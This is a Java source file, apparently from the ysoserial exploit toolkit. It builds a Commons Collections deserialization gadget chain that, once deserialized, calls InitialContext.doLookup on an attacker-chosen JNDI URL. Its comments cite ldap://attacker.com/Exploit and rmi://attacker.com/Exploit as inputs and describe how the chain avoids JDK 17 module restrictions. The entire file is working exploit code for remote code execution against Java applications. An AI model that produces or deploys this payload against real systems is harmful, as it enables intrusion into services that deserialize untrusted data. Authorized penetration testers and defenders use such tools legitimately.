package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	CC chain with JNDI lookup sink — NO TemplatesImpl needed.
	Works on JDK 17+ where TemplatesImpl module access is restricted.

	Gadget chain:
		ObjectInputStream.readObject()
			HashSet.readObject()
				HashMap.put()
					HashMap.hash()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer → javax.naming.InitialContext.class
										InvokerTransformer → InitialContext.doLookup(jndiUrl)

	Sink: InitialContext.doLookup() — static method, directly calls JNDI lookup
	No TemplatesImpl, no Unsafe, no module opens needed for the sink.

	Usage: payload arg is JNDI URL, e.g.:
		ldap://attacker.com/Exploit
		rmi://attacker.com/Exploit

	Requires:
		commons-collections 3.x
		Target must allow outbound JNDI (no trustURLCodebase=false)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MBECHLER })
public class CommonsCollectionsJndi extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String jndiUrl) throws Exception {

		// Inert during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real chain: InitialContext.doLookup(jndiUrl)
		// doLookup is a static method, so we invoke it on the Class object
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(javax.naming.InitialContext.class),
			new InvokerTransformer("getDeclaredMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"doLookup", new Class[] { String.class } }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[] { jndiUrl } }),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		HashSet map = new HashSet(1);
		map.add("foo");
		Field f = null;
		try {
			f = HashSet.class.getDeclaredField("map");
		} catch (NoSuchFieldException e) {
			f = HashSet.class.getDeclaredField("backingMap");
		}
		Reflections.setAccessible(f);
		HashMap innimpl = (HashMap) f.get(map);

		Field f2 = null;
		try {
			f2 = HashMap.class.getDeclaredField("table");
		} catch (NoSuchFieldException e) {
			f2 = HashMap.class.getDeclaredField("elementData");
		}
		Reflections.setAccessible(f2);
		Object[] array = (Object[]) f2.get(innimpl);

		Object node = array[0];
		if (node == null) node = array[1];

		Field keyField = null;
		try {
			keyField = node.getClass().getDeclaredField("key");
		} catch (Exception e) {
			keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
		}
		Reflections.setAccessible(keyField);
		keyField.set(node, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsJndi.class, args);
	}
}
